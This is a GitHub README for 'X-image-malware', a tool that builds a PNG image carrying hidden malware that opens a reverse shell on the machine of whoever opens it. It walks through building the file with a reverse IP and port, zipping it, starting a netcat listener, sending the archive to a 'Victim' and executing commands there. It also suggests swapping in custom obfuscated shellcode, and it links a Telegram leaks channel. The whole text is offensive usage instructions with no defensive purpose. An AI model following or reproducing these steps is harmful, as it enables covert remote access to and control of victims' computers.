# X-image-malware
png malware for initial access and open rev sockets

## installation
`git clone https://github.com/hunt3rub/X-image-malware.git`<br/>
`pip install requirements.txt`

## how to build PNG malware?
### 1- build malicious PNG picture:
`python3 main.py -reverse-ip 192.168.1.1 -reverse-port 4242 -img custom-picture.png`<br/>
### 2- zip or rar build folder:
open build folder and `zip all files`.
see a picture with png format and two hidden picture.

### 3- open listener:
`nc -lvnp 4242`<br/>
> [!NOTE]
> you must open port 4242 in firewall and have static ip.

### 4- send zip folder to Victim:
after open PNG file you can access to victim and exec command!

## customized shellcode:
open shellcode.py and set your custom payload with obfuscate.

for free gaza
telegram channel: https://t.me/@our_leaks
